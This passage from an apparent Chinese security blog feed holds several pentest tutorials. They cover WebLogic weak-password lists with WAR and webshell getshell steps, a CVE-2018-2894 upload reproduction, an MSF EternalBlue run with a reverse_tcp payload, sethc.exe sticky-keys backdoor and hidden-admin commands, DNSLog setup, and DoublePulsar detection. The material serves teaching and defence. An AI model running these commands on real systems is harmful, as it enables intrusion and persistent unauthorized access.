src="/2021/04/03/浅析DNS域传送漏洞/5.png" alt=""></p><p>如果指定了存在DNS域传送漏洞的DNS服务器，再次查询目标域名的子域名信息时就会直接返回回来：</p><p><img src="/2021/04/03/浅析DNS域传送漏洞/6.png" alt=""></p><h4 id="通过Nmap检测"><a href="#通过Nmap检测" class="headerlink" title="通过Nmap检测"></a>通过Nmap检测</h4><p>使用DNS域传送脚本检测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -script dns-zone-transfer -script-args dns-zone-transfer.domain=xxx.yyy.com -p 53 -Pn dns.xxx.yyy.com</span><br></pre></td></tr></table></figure><p><img src="/2021/04/03/浅析DNS域传送漏洞/3.png" alt=""></p><h4 id="通过dnsrecon检测"><a href="#通过dnsrecon检测" class="headerlink" title="通过dnsrecon检测"></a>通过dnsrecon检测</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsrecon -d example.com</span><br></pre></td></tr></table></figure><h4 id="通过dnsenum检测"><a href="#通过dnsenum检测" class="headerlink" title="通过dnsenum检测"></a>通过dnsenum检测</h4><p>dnsenum默认包含自动检测域传送漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsenum example.com</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="渗透测试基础" scheme="https://www.mi1k7ea.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic弱口令getshell</title>
    <link href="https://www.mi1k7ea.com/2021/04/01/WebLogic%E5%BC%B1%E5%8F%A3%E4%BB%A4getshell/"/>
    <id>https://www.mi1k7ea.com/2021/04/01/WebLogic弱口令getshell/</id>
    <published>2021-04-01T13:54:18.000Z</published>
    <updated>2021-05-29T07:57:46.724Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>总结在WebLogic弱口令登录console的场景下的getshell方式。</p><h2 id="0x01-WebLogic常见弱口令"><a href="#0x01-WebLogic常见弱口令" class="headerlink" title="0x01 WebLogic常见弱口令"></a>0x01 WebLogic常见弱口令</h2><table><thead><tr><th style="text-align:center">账户</th><th style="text-align:center">密码</th></tr></thead><tbody><tr><td style="text-align:center">system</td><td style="text-align:center">password</td></tr><tr><td style="text-align:center">weblogic</td><td style="text-align:center">weblogic</td></tr><tr><td style="text-align:center">guest</td><td style="text-align:center">guest</td></tr><tr><td style="text-align:center">portaladmin</td><td style="text-align:center">portaladmin</td></tr><tr><td style="text-align:center">admin</td><td style="text-align:center">security</td></tr><tr><td style="text-align:center">joe</td><td style="text-align:center">password</td></tr><tr><td style="text-align:center">mary</td><td style="text-align:center">password</td></tr><tr><td style="text-align:center">system</td><td style="text-align:center">security</td></tr><tr><td style="text-align:center">wlcsystem</td><td style="text-align:center">wlcsystem</td></tr><tr><td style="text-align:center">wlcsystem</td><td style="text-align:center">sipisystem</td></tr></tbody></table><p>更多的一些常见弱密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">weblogic1</span><br><span class="line">weblogic12</span><br><span class="line">weblogic123</span><br><span class="line">weblogic@123</span><br><span class="line">webl0gic</span><br><span class="line">weblogic#</span><br><span class="line">weblogic@</span><br></pre></td></tr></table></figure><h2 id="0x02-WebLogic控制台getshell"><a href="#0x02-WebLogic控制台getshell" class="headerlink" title="0x02 WebLogic控制台getshell"></a>0x02 WebLogic控制台getshell</h2><h3 id="部署WAR包getshell"><a href="#部署WAR包getshell" class="headerlink" title="部署WAR包getshell"></a>部署WAR包getshell</h3><p>弱口令登录WebLogic控制台，点击”锁定并编辑”：</p><p><img src="/2021/04/01/WebLogic弱口令getshell/1.png" alt=""></p><p>点击部署，然后安装：</p><p><img src="/2021/04/01/WebLogic弱口令getshell/2.png" alt=""></p><p>点击上载文件：</p><p><img src="/2021/04/01/WebLogic弱口令getshell/3.png" alt=""></p><p>在部署档案中上传恶意WAR包文件后，点击位于上方的下一步：</p><p><img src="/2021/04/01/WebLogic弱口令getshell/4.png" alt=""></p><p>继续默认点击位于上方的下一步，直至遇到并点击完成：</p><p><img src="/2021/04/01/WebLogic弱口令getshell/5.png" alt=""></p><p>接着激活更改：</p><p><img src="/2021/04/01/WebLogic弱口令getshell/6.png" alt=""></p><p>启动我们部署的WAR包程序：</p><p><img src="/2021/04/01/WebLogic弱口令getshell/7.png" alt=""></p><p>正常启动之后，如下：</p><p><img src="/2021/04/01/WebLogic弱口令getshell/8.png" alt=""></p><p>连上：</p><p><img src="/2021/04/01/WebLogic弱口令getshell/9.png" alt=""></p><p><strong>恶意WAR包制作</strong>：</p><ol><li>先编写一个恶意的jsp文件或者使用哥斯拉等工具直接生成，如test.jsp；</li><li>将test.jsp压缩成zip格式的压缩文件，如test.zip；</li><li>直接修改zip压缩文件的后缀名为war即可，如test.war；</li></ol>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="WebLogic" scheme="https://www.mi1k7ea.com/tags/WebLogic/"/>
    
  </entry>
  
  <entry>
    <title>浅析WebLogic任意文件上传（CVE-2018-2894）</title>
    <link href="https://www.mi1k7ea.com/2021/04/01/%E6%B5%85%E6%9E%90Weblogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88CVE-2018-2894%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/04/01/浅析Weblogic任意文件上传（CVE-2018-2894）/</id>
    <published>2021-04-01T01:49:22.000Z</published>
    <updated>2021-04-05T10:07:46.894Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>简单学习WebLogic任意文件上传（CVE-2018-2894）漏洞。</p><h2 id="0x01-CVE-2018-2894"><a href="#0x01-CVE-2018-2894" class="headerlink" title="0x01 CVE-2018-2894"></a>0x01 CVE-2018-2894</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>用的Vulhub：<a href="https://vulhub.org/#/environments/weblogic/CVE-2018-2894/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/CVE-2018-2894/</a></p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>开启了Weblogic Web Service Test Page，此配置项默认是关闭的；</li><li>知道Web目录路径；</li></ul><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Oracle WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Weblogic Web Service Test Page中存在任意文件上传漏洞，攻击者可上传任意jsp文件来getshell。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问<code>http://ip:7001/console</code>进入到登录界面。</p><p>使用如下命令来查找WebLogic的密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@DGSec:~/vulhub/weblogic/CVE-2018-2894<span class="comment"># docker-compose logs | grep password</span></span><br><span class="line">weblogic_1  |       ----&gt; <span class="string">'weblogic'</span> admin password: cqy9mA2m</span><br><span class="line">weblogic_1  | admin password  : [cqy9mA2m]</span><br><span class="line">weblogic_1  | *  password assigned to an admin-level user.  For *</span><br></pre></td></tr></table></figure><p>登录上去之后，点击base_domain，在”配置”-&gt;”一般信息”-&gt;”高级”中开启”启用 Web 服务测试页”选项：</p><p><img src="/2021/04/01/浅析Weblogic任意文件上传（CVE-2018-2894）/1.png" alt=""></p><p>接着访问<code>http://ip:7001/ws_utc/config.do</code>页面，即Web服务测试页，设置Work Home Dir即当前的工作目录为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>，即将目录设置为ws-utc应用的静态css文件目录，因为该目录是无需权限的：</p><p><img src="/2021/04/01/浅析Weblogic任意文件上传（CVE-2018-2894）/2.png" alt=""></p><p>接着，点击左侧的安全栏目来添加JSP WebShell，这里WebShell用的哥斯拉生成的：</p><p><img src="/2021/04/01/浅析Weblogic任意文件上传（CVE-2018-2894）/3.png" alt=""></p><p>抓包记下响应报文的时间戳：</p><p><img src="/2021/04/01/浅析Weblogic任意文件上传（CVE-2018-2894）/4.png" alt=""></p><p>访问路径，是存在的：<code>http://ip:7001/ws_utc/css/config/keystore/1617251643547_shell.jsp</code></p><p>连上：</p><p><img src="/2021/04/01/浅析Weblogic任意文件上传（CVE-2018-2894）/5.png" alt=""></p><p>最后，个人测试以下几个静态目录都是可行的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/js</span><br><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/images</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>待分析…</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>升级WebLogic版本。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="WebLogic" scheme="https://www.mi1k7ea.com/tags/WebLogic/"/>
    
  </entry>
  
  <entry>
    <title>自建DNSLog平台</title>
    <link href="https://www.mi1k7ea.com/2021/03/29/%E8%87%AA%E5%BB%BADNSLog%E5%B9%B3%E5%8F%B0/"/>
    <id>https://www.mi1k7ea.com/2021/03/29/自建DNSLog平台/</id>
    <published>2021-03-29T13:13:05.000Z</published>
    <updated>2021-03-31T15:24:43.866Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有时候网上一些常用的DNSLog平台可能会被目标站点黑名单过滤掉，此时就可以自建DNSLog平台来应对这种情况了。</p><h2 id="0x01-自建DNSLog平台"><a href="#0x01-自建DNSLog平台" class="headerlink" title="0x01 自建DNSLog平台"></a>0x01 自建DNSLog平台</h2><p>本次使用一个域名的方式来搭建，而非网上大多数采用两个域名的方式搭建。</p><p>先准备一个域名和一台vps，这里均用的阿里云。</p><p>接着，到云解析DNS中，进行相应的配置：</p><p><img src="/2021/03/29/自建DNSLog平台/1.png" alt=""></p><p>其中红框为vps的IP地址，蓝框为域名的ns1和ns2子域。</p><p>然后，在云服务器ECS安全组规则里添加对外开发53端口的规则，协议是UDP。</p><p>接着搭建DNSLog服务端，这里使用的DNSlog-GO，项目地址：<a href="https://github.com/lanyi1998/DNSlog-GO" target="_blank" rel="noopener">https://github.com/lanyi1998/DNSlog-GO</a></p><p>下载到vps上之后，需要先安装GO环境，参考：<a href="https://blog.csdn.net/u014454538/article/details/88649963" target="_blank" rel="noopener">https://blog.csdn.net/u014454538/article/details/88649963</a></p><p>GO环境安装完成之后，直接运行main即可：</p><p><img src="/2021/03/29/自建DNSLog平台/2.png" alt=""></p><p>此时Web界面就可以访问了，试下ping效果：</p><p><img src="/2021/03/29/自建DNSLog平台/3.png" alt=""></p><p>没问题了，但是最后有个疑问，就是ping得出的IP是127.0.0.1？有点意思哈哈</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="DNSLog" scheme="https://www.mi1k7ea.com/tags/DNSLog/"/>
    
  </entry>
  
  <entry>
    <title>DoublePulsar后门检测</title>
    <link href="https://www.mi1k7ea.com/2021/03/27/DoublePulsar%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B/"/>
    <id>https://www.mi1k7ea.com/2021/03/27/DoublePulsar后门检测/</id>
    <published>2021-03-27T08:00:32.000Z</published>
    <updated>2021-03-27T08:51:01.947Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>一般的，DoublePulsar后门会和Wannacry一块出没。而这就需要在做应急响应或者内网主机安全排查的时候来进行检测。</p><h2 id="0x01-DoublePulsar后门检测"><a href="#0x01-DoublePulsar后门检测" class="headerlink" title="0x01 DoublePulsar后门检测"></a>0x01 DoublePulsar后门检测</h2><h3 id="DoublePulsar简介"><a href="#DoublePulsar简介" class="headerlink" title="DoublePulsar简介"></a>DoublePulsar简介</h3><p>DoublePulsar是由美国国家安全局（NSA）方程式组开发的后门植入工具，于2017年初由影子经纪人（The Shadow Brokers）泄露。该工具仅在几周内感染了超过200,000台Microsoft Windows计算机，并在2017年5月的WannaCry勒索软件攻击中与EternalBlue一起使用。</p><p>DoublePulsar以内核模式运行， 属于Rootkit，这使网络犯罪分子能够对计算机系统进行高级别的控制。安装后，它使用三个命令：ping、kill和 exec、exec可用于将恶意软件加载到系统上。</p><p>具体漏洞分析参考：<a href="https://www.freebuf.com/news/138725.html" target="_blank" rel="noopener">https://www.freebuf.com/news/138725.html</a></p><h3 id="DoublePulsar后门检测方法"><a href="#DoublePulsar后门检测方法" class="headerlink" title="DoublePulsar后门检测方法"></a>DoublePulsar后门检测方法</h3><h4 id="GitHub检测脚本"><a href="#GitHub检测脚本" class="headerlink" title="GitHub检测脚本"></a>GitHub检测脚本</h4><p>项目地址：<a href="https://github.com/countercept/doublepulsar-detection-script" target="_blank" rel="noopener">https://github.com/countercept/doublepulsar-detection-script</a></p><p>以Python2运行，分为SMB和RDP两个脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python detect_doublepulsar_smb.py --ip 192.168.175.128</span></span><br><span class="line">[-] [192.168.175.128] No presence of DOUBLEPULSAR SMB implant</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># python detect_doublepulsar_smb.py --ip 192.168.175.128</span></span><br><span class="line">[+] [192.168.175.128] DOUBLEPULSAR SMB IMPLANT DETECTED!!!</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># python detect_doublepulsar_rdp.py --file ips.list --verbose --threads 1</span></span><br><span class="line">[*] [192.168.175.141] Sending negotiation request</span><br><span class="line">[*] [192.168.175.141] Server explicitly refused SSL, reconnecting</span><br><span class="line">[*] [192.168.175.141] Sending non-ssl negotiation request</span><br><span class="line">[*] [192.168.175.141] Sending ping packet</span><br><span class="line">[-] [192.168.175.141] No presence of DOUBLEPULSAR RDP implant</span><br><span class="line">[*] [192.168.175.143] Sending negotiation request</span><br><span class="line">[*] [192.168.175.143] Server chose to use SSL - negotiating SSL connection</span><br><span class="line">[*] [192.168.175.143] Sending SSL client data</span><br><span class="line">[*] [192.168.175.143] Sending ping packet</span><br><span class="line">[-] [192.168.175.143] No presence of DOUBLEPULSAR RDP implant</span><br><span class="line">[*] [192.168.175.142] Sending negotiation request</span><br><span class="line">[*] [192.168.175.142] Sending client data</span><br><span class="line">[*] [192.168.175.142] Sending ping packet</span><br><span class="line">[+] [192.168.175.142] DOUBLEPULSAR RDP IMPLANT DETECTED!!!</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># python2 detect_doublepulsar_smb.py --ip 192.168.175.136 --uninstall</span></span><br><span class="line">[+] [192.168.175.136] DOUBLEPULSAR SMB IMPLANT DETECTED!!! XOR Key: 0x7c3bf3c1</span><br><span class="line">[+] [192.168.175.136] DOUBLEPULSAR uninstall successful</span><br></pre></td></tr></table></figure><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>参考：<a href="https://nmap.org/nsedoc/scripts/smb-double-pulsar-backdoor.html" target="_blank" rel="noopener">https://nmap.org/nsedoc/scripts/smb-double-pulsar-backdoor.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 445 &lt;target&gt; --script=smb-double-pulsar-backdoor</span><br></pre></td></tr></table></figure><p>扫描输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">| smb-double-pulsar-backdoor:</span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Double Pulsar SMB Backdoor</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: HIGH  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C)</span><br><span class="line">|       The Double Pulsar SMB backdoor was detected running on the remote machine.</span><br><span class="line">|</span><br><span class="line">|     Disclosure date: 2017-04-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://isc.sans.edu/forums/diary/Detecting+SMB+Covert+Channel+Double+Pulsar/22312/</span><br><span class="line">|       https://github.com/countercept/doublepulsar-detection-script</span><br><span class="line">|_      https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation</span><br></pre></td></tr></table></figure><h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载对应的MSF插件并复制到目标目录中</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git</span><br><span class="line"><span class="built_in">cd</span> Eternalblue-Doublepulsar-Metasploit/</span><br><span class="line">cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32 --fix-missing</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建.wine/drive_c目录，否则后续利用漏洞时会出现目录不存在错误</span></span><br><span class="line">mkdir -p /root/.wine/drive_c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启MSF并重新加载插件</span></span><br><span class="line">msfconsole</span><br><span class="line">reload_all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 漏洞利用</span></span><br><span class="line">use exploit/windows/smb/eternalblue_doublepulsar</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.200.142</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.200.130</span><br><span class="line"><span class="built_in">set</span> PROCESSINJECT explorer.exe <span class="comment"># 注意，需要设置PROCESSINJECT，使用默认值并没成功，改PROCESSINJECT为explorer.exe成功</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>如果扫描出来，可以应用前面的检测脚本清理掉：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 detect_doublepulsar_smb.py --ip 192.168.175.136 --uninstall</span><br></pre></td></tr></table></figure><p>然后，安装补丁。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Windows" scheme="https://www.mi1k7ea.com/categories/Windows/"/>
    
    
      <category term="Windows" scheme="https://www.mi1k7ea.com/tags/Windows/"/>
    
      <category term="DoublePulsar" scheme="https://www.mi1k7ea.com/tags/DoublePulsar/"/>
    
  </entry>
  
  <entry>
    <title>Windows Shift后门利用</title>
    <link href="https://www.mi1k7ea.com/2021/03/26/Windows-Shift%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/"/>
    <id>https://www.mi1k7ea.com/2021/03/26/Windows-Shift后门利用/</id>
    <published>2021-03-26T15:55:01.000Z</published>
    <updated>2021-03-26T16:31:02.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>通常，在内网渗透打下一台机子之后，可以给这台机子留个Shift后门。</p><h2 id="0x01-Shift后门利用"><a href="#0x01-Shift后门利用" class="headerlink" title="0x01 Shift后门利用"></a>0x01 Shift后门利用</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>粘滞键漏洞，在Windows系统下连续按5下SHIFT键，可以启动系统的粘滞键功能，其进程名为Sethc.exe，应用程序在Windows\system32下。</p><p>黑客用其它应用程序（如：cmd.exe、explorer.exe 或木马、病毒）将Sethc.exe替换。当再次连续按5次SHIFT键，就会启动黑客替换的应用程序，如此便留下了5下SHIFT后门，黑客3389登录远程计算机时，在用户登录界面，连续按5下SHIFT就可以启动该漏洞，进而控制远程计算机。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在Windows系统登录界面状态下，粘滞键仍可以以连续按5下SHIFT键运行，并且此时应用程序会以WINDOWS的最高权限－SYSTEM权限运行，所以计算机一旦被安装该后门，入侵者便可悄无声息地远程操纵计算机。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>大致思路如下：</p><p>拿到目标主机权限后，到Windows\system32目录下，将sethc.exe替换成cmd.exe；</p><p>其中，命令行方式为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe</span><br><span class="line">copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe</span><br><span class="line">attrib c:\windows\system32\sethc.exe +h</span><br><span class="line">attrib c:\windows\system32\dllcache\sethc.exe +h</span><br></pre></td></tr></table></figure><p>注意：要将dllcache文件夹中的缓存删掉，否则会自动复原回去。</p><p>注册表方式为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"</span> /v Debugger /t REG_SZ /d <span class="string">"C:\windows\system32\cmd.exe"</span></span><br></pre></td></tr></table></figure><p>命令说明：reg add是向注册表添加记录，后面跟的是注册表的位置，注意的是HKLM是HKEY_LOCAL_MACHINE的缩写。Image File Execution Option这个目录是用来设置镜像劫持的，要被劫持的就是命令中的sethc粘滞键程序，随后通过<code>/ v</code>来指定键名，其中键名debugger是固定的，然后通过<code>/ t</code>来指定REG_SZ字符串类型，最后通过<code>/ d</code>来指定键的值，即被恶意替换的程序cmd.exe。</p><p>这样，在下次远程连接目标主机登录的时候就可以连续5下SHIFT触发cmd.exe；</p><p>可以输入explorer.exe调出程序管理系统方便操作；</p><p>当然，上面的方法存在缺陷，就是可能会导致远程连接无法持久进行，因此可以直接添加新用户便于下次直接登录：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user mi1k7ea <span class="number">123456</span> /add</span><br><span class="line">net localgroup administrators mi1k7ea /add<span class="string">'</span></span><br></pre></td></tr></table></figure><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>如果系统盘为NTFS文件系统，可以将sytem32下的sethc.exe文件设为everyone拒绝访问；</li><li>直接将其删除，最好的方法是在控制面板-辅助功能选项-粘滞键选项，将“使用快捷键”取消即可。；</li><li>通过注册表设置实现防御；</li></ul>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="渗透测试基础" scheme="https://www.mi1k7ea.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>基于SqlDataSourceEnumerator探测内网存活主机</title>
    <link href="https://www.mi1k7ea.com/2021/03/06/%E5%9F%BA%E4%BA%8ESqlDataSourceEnumerator%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA/"/>
    <id>https://www.mi1k7ea.com/2021/03/06/基于SqlDataSourceEnumerator探测内网存活主机/</id>
    <published>2021-03-06T06:24:00.000Z</published>
    <updated>2021-03-06T06:24:37.353Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>参考Micro8系列第五十课：<a href="https://micro8.gitbook.io/micro8/contents-1/41-50/50-ji-yu-sqldatasourceenumerator-fa-xian-nei-wang-cun-huo-zhu-ji" target="_blank" rel="noopener">https://micro8.gitbook.io/micro8/contents-1/41-50/50-ji-yu-sqldatasourceenumerator-fa-xian-nei-wang-cun-huo-zhu-ji</a></p><h2 id="0x01-基于SqlDataSourceEnumerator探测内网存活主机"><a href="#0x01-基于SqlDataSourceEnumerator探测内网存活主机" class="headerlink" title="0x01 基于SqlDataSourceEnumerator探测内网存活主机"></a>0x01 基于SqlDataSourceEnumerator探测内网存活主机</h2><p>从Windows XP开始，默认就带有.NET Framework，而在PowerShell出现之后，其调用更为简便。</p><p>System.Data.SqlClient命名空间是用于SQL Server的.NET数据提供程序。在.NET Framework 2.0中新增加SqlDataSourceEnumerator类，其提供了一种枚举本地网络内的所有可用SQL Server实例机制。</p><p>微软官方是这样解释的：<a href="https://docs.microsoft.com/zh-CN/dotnet/api/system.data.sql.sqldatasourceenumerator?view=netframework-4.8&amp;viewFallbackFrom=netcore-3.0" target="_blank" rel="noopener">https://docs.microsoft.com/zh-CN/dotnet/api/system.data.sql.sqldatasourceenumerator?view=netframework-4.8&amp;viewFallbackFrom=netcore-3.0</a></p><blockquote><p>SQL Server 使应用程序能够确定当前网络中是否存在其实例。 SqlDataSourceEnumerator类向应用程序开发人员公开此信息，并提供 DataTable 包含有关所有可用服务器的信息。 此返回的表包含与用户尝试创建新连接时提供的列表匹配的服务器实例的列表，并且在 Connection Properties 对话框中展开包含所有可用服务器的下拉列表。</p></blockquote><p>调用示例：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PowerShell -Command </span><br><span class="line"><span class="string">"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"</span></span><br></pre></td></tr></table></figure><p>该方法在实战中不留文件痕迹并且信息准确，同时可以进行主机发现。可应对目前主流安全防御产品。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
